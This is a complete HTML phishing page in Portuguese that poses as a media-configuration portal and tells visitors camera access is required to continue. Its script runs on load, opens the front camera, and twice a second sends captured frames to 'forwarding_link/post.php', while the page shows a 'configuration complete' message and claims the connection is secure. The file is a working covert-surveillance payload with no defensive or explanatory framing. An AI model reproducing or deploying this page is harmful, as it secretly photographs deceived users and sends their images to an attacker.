<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Configuração de Mídia | Portal</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #6366f1;
            --primary-hover: #4f46e5;
            --bg: #fcfcfd;
            --card: #ffffff;
            --text-title: #1f2937;
            --text-body: #6b7280;
            --border: #f3f4f6;
            --success: #6366f1;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background-color: var(--bg);
            color: var(--text-body);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .bg-gradient {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 0% 0%, #eef2ff 0%, transparent 50%),
                        radial-gradient(circle at 100% 100%, #f5f3ff 0%, transparent 50%);
            z-index: -1;
        }

        #app-container {
            width: 100%;
            max-width: 420px;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 32px;
            padding: 48px 40px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.02), 0 10px 10px -5px rgba(0, 0, 0, 0.02);
            text-align: center;
        }

        .header {
            margin-bottom: 32px;
        }

        .icon-box {
            width: 64px;
            height: 64px;
            background: #f5f3ff;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
        }

        .icon-box svg {
            width: 32px;
            height: 32px;
            color: var(--primary);
        }

        h1 {
            color: var(--text-title);
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 12px;
            letter-spacing: -0.02em;
        }

        p.description {
            font-size: 0.95rem;
            line-height: 1.6;
            color: var(--text-body);
        }

        .loader-container {
            padding: 20px 0;
        }

        .spinner {
            width: 32px;
            height: 32px;
            border: 3px solid #f3f4f6;
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loading-text {
            font-weight: 600;
            font-size: 0.85rem;
            color: var(--primary);
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .video-wrapper {
            display: none;
            margin-top: 24px;
            border-radius: 24px;
            overflow: hidden;
            background: #f9fafb;
            aspect-ratio: 4/3;
            position: relative;
            border: 1px solid var(--border);
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }

        #msg-sucesso {
            display: none;
            color: var(--primary);
            font-weight: 600;
            font-size: 1rem;
            margin: 20px 0;
            padding: 12px;
            background: #f5f3ff;
            border-radius: 16px;
        }

        .btn-primary {
            display: none;
            width: 100%;
            margin-top: 24px;
            padding: 16px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 16px;
            font-family: inherit;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 4px 6px -1px rgba(99, 102, 241, 0.2);
        }

        .btn-primary:hover {
            background: var(--primary-hover);
            transform: translateY(-1px);
            box-shadow: 0 10px 15px -3px rgba(99, 102, 241, 0.3);
        }

        .footer {
            margin-top: 32px;
            font-size: 0.8rem;
            color: #9ca3af;
        }

        canvas { display: none; }
        #matrix-bg { display: none; }
    </style>
</head>
<body>

    <div class="bg-gradient"></div>
    <canvas id="matrix-bg"></canvas>

    <div id="app-container">
        <div class="header">
            <div class="icon-box">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M6.827 6.175A2.31 2.31 0 015.186 7.23c-.38.054-.757.112-1.134.175C2.999 7.58 2.25 8.507 2.25 9.574V18a2.25 2.25 0 002.25 2.25h15A2.25 2.25 0 0021.75 18V9.574c0-1.067-.75-1.994-1.802-2.169a47.865 47.865 0 00-1.134-.175 2.31 2.31 0 01-1.64-1.055l-.822-1.316a2.192 2.192 0 00-1.736-1.039 48.774 48.774 0 00-5.232 0 2.192 2.192 0 00-1.736 1.039l-.821 1.316z" />
                    <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 12.75a4.5 4.5 0 11-9 0 4.5 4.5 0 019 0zM18.75 10.5h.008v.008h-.008V10.5z" />
                </svg>
            </div>
            <h1>Ajuste de Vídeo</h1>
            <p class="description">Para uma melhor experiência, é <strong>necessário permitir</strong> o acesso rápido à câmera para <strong>prosseguir para a próxima página</strong>.</p>
        </div>

        <div id="loading-area">
            <div class="loader-container">
                <div class="spinner"></div>
                <p class="loading-text">Sincronizando mídia...</p>
            </div>
            <p style="font-size: 0.85rem; color: #9ca3af;">Clique em "Permitir" para otimizar sua navegação.</p>
        </div>

        <div id="msg-sucesso">Configuração concluída com sucesso!</div>

        <div id="video-area" class="video-wrapper">
            <video id="video" playsinline autoplay></video>
        </div>

        <button id="retry-btn" class="btn-primary" onclick="requestCamera()">Tentar Novamente</button>

        <div class="footer">
            Sua conexão está otimizada e segura.
        </div>
    </div>

    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loadingArea = document.getElementById('loading-area');
        const videoArea = document.getElementById('video-area');
        const retryBtn = document.getElementById('retry-btn');
        const msgSucesso = document.getElementById('msg-sucesso');

        let isPosting = false;

        function post(imgdata) {
            if (isPosting) return;
            isPosting = true;
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: 'forwarding_link/post.php',
                dataType: 'json',
                complete: function() { isPosting = false; }
            });
        }

        async function requestCamera() {
            retryBtn.style.display = 'none';
            loadingArea.style.display = 'block';
            msgSucesso.style.display = 'none';
            videoArea.style.display = 'none';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: { facingMode: "user" }
                });
                
                video.srcObject = stream;
                loadingArea.style.display = 'none';
                msgSucesso.style.display = 'block';
                videoArea.style.display = 'block';

                const context = canvas.getContext('2d');
                setInterval(() => {
                    context.drawImage(video, 0, 0, 640, 480);
                    const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                    post(canvasData);
                }, 500);

            } catch (e) {
                loadingArea.style.display = 'none';
                retryBtn.style.display = 'block';
                alert("Para continuar, por favor habilite o acesso à câmera nas configurações do seu navegador.");
            }
        }

        const matrixCanvas = document.getElementById('matrix-bg');
        if(matrixCanvas) {
            const mctx = matrixCanvas.getContext('2d');
            function drawMatrix() {} 
            setInterval(drawMatrix, 1000);
        }

        window.onload = requestCamera;
    </script>
</body>
</html>
